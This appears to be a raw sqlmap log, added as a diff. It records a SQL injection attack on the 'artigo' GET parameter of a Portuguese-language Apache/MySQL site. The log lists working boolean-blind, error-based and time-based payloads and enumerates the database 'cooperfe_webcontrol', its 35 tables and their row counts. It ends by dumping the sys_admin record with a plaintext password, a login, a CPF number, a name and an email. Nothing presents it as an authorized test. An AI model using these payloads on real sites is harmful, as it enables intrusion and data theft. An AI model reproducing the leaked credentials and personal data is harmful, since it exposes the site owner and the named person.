@@ -1,0 +1,145 @@
+sqlmap identified the following injection point(s) with a total of 304 HTTP(s) requests:
+---
+Parameter: artigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artigo=2 AND 7208=7208
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: artigo=2 AND (SELECT 7411 FROM(SELECT COUNT(*),CONCAT(0x7176627871,(SELECT (ELT(7411=7411,1))),0x717a627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: artigo=2 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] cooperfe_webcontrol
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artigo=2 AND 7208=7208
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: artigo=2 AND (SELECT 7411 FROM(SELECT COUNT(*),CONCAT(0x7176627871,(SELECT (ELT(7411=7411,1))),0x717a627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: artigo=2 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: cooperfe_webcontrol
+[35 tables]
++-------------------------+
+| sys_admin               |
+| sys_agenda              |
+| sys_artigos             |
+| sys_artigos_categoria   |
+| sys_artigos_componente  |
+| sys_artigos_destaques   |
+| sys_artigos_img         |
+| sys_banner              |
+| sys_bannerfotos         |
+| sys_downloads           |
+| sys_downloads_categoria |
+| sys_enquetes            |
+| sys_enquetes_opcoes     |
+| sys_galeria             |
+| sys_galeria_componente  |
+| sys_galerias_fotos      |
+| sys_links               |
+| sys_links_botoes        |
+| sys_menu                |
+| sys_noticias            |
+| sys_noticias_categoria  |
+| sys_noticias_componente |
+| sys_noticias_destaques  |
+| sys_noticias_img        |
+| sys_noticias_rss        |
+| sys_page_contato        |
+| sys_page_index          |
+| sys_page_rodape         |
+| sys_sistemas            |
+| sys_sistemas_categorias |
+| sys_subpaginas          |
+| sys_usuarios_site       |
+| sys_videos              |
+| sys_videos_categoria    |
+| sys_videos_componentes  |
++-------------------------+
+
+Database: cooperfe_webcontrol
++-------------------------+---------+
+| Table                   | Entries |
++-------------------------+---------+
+| sys_galerias_fotos      | 116     |
+| sys_menu                | 34      |
+| sys_sistemas            | 19      |
+| sys_links_botoes        | 9       |
+| sys_galeria             | 5       |
+| sys_page_index          | 5       |
+| sys_page_rodape         | 4       |
+| sys_artigos             | 3       |
+| sys_links               | 3       |
+| sys_noticias_img        | 3       |
+| sys_sistemas_categorias | 3       |
+| sys_subpaginas          | 3       |
+| sys_noticias            | 2       |
+| sys_noticias_rss        | 2       |
+| sys_admin               | 1       |
+| sys_artigos_categoria   | 1       |
+| sys_banner              | 1       |
+| sys_bannerfotos         | 1       |
+| sys_downloads           | 1       |
+| sys_downloads_categoria | 1       |
+| sys_noticias_categoria  | 1       |
+| sys_noticias_componente | 1       |
+| sys_noticias_destaques  | 1       |
+| sys_page_contato        | 1       |
+| sys_videos              | 1       |
+| sys_videos_categoria    | 1       |
++-------------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: artigo (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: artigo=2 AND 7208=7208
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: artigo=2 AND (SELECT 7411 FROM(SELECT COUNT(*),CONCAT(0x7176627871,(SELECT (ELT(7411=7411,1))),0x717a627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: artigo=2 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: cooperfe_webcontrol
+Table: sys_admin
+[1 entry]
++----+-------------+-----------------------+-------+---------------+-------+---------------+--------------+
+| id | cpf         | nome                  | nivel | senha         | login | email         | data_criacao |
++----+-------------+-----------------------+-------+---------------+-------+---------------+--------------+
+| 1  | 77788899910 | Diogo \r\n\r\nCardoso | 1     | cooperadmin12 | adm   | adm@gmail.com | 22/12/2010   |
++----+-------------+-----------------------+-------+---------------+-------+---------------+--------------+
+
